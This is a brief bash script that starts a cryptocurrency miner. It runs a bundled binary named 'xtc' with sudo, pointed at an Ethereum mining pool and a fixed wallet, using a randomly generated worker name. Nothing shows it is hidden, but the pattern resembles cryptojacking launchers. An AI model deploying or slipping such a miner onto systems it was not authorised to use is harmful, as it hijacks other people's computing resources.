#!/bin/bash

POOL=eth.2miners.com:2020
WALL=0x491fcd9921b694454fff2882836526177d4317a8
WORK=$(echo $(shuf -i 1000-999999999 -n 1)-XTC)

cd "$(dirname "$0")"

chmod +x ./xtc && sudo ./xtc -pool $POOL -wal $WALL.$WORK -proto 3
